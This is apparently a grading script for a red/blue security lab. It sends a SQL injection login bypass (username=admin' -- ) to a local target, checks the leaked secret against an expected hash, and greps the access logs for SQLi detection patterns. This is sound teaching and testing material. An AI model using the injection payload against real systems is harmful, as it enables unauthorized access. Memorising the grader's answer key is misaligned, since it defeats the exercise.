#!/usr/bin/env bash
# Objective grading for web-01. Two checks:
#   1. RED  — the SQLi actually exfiltrates the secret (proves you exploited it)
#   2. BLUE — the detection fires on the attack traffic (proves you can catch it)
# Exits non-zero on FAIL.
set -uo pipefail

TARGET="${TARGET:-http://127.0.0.1:8080}"
EXPECTED_SHA="44eaee0233fcedb30a3bcc212084d8b33c297392dedb829adbe47cd58970bf9f"
LOGFILE="/var/log/app/access.log"
pass=1

sha256() { shasum -a 256 2>/dev/null | awk '{print $1}' || sha256sum | awk '{print $1}'; }

echo "== Check 1: exploit works (red) =="
RESP=$(curl -s -X POST "$TARGET/login" \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=x" || true)
SECRET=$(printf '%s' "$RESP" | sed -n 's/.*"secret":"\([^"]*\)".*/\1/p')
GOT_SHA=$(printf '%s' "$SECRET" | sha256)

if [ "$GOT_SHA" = "$EXPECTED_SHA" ]; then
  echo "  [PASS] injection returned the correct secret"
else
  echo "  [FAIL] injection did not return the expected secret (patched target, or app down?)"
  pass=0
fi

echo "== Check 2: detection fires (blue) =="
HITS=$(docker compose exec -T target grep -Eic "-- |/\*|' or |or 1=1|user=\"[^\"]*'" "$LOGFILE" 2>/dev/null || echo 0)
if [ "${HITS:-0}" -gt 0 ]; then
  echo "  [PASS] detection matched $HITS SQLi indicator(s) in the logs"
else
  echo "  [FAIL] detection found nothing — run 'make attack' first"
  pass=0
fi

echo "--------------------------------------------"
if [ "$pass" -eq 1 ]; then
  echo "PASS — you exploited it AND you can detect it. On to the fix."
  exit 0
else
  echo "FAIL"
  exit 1
fi
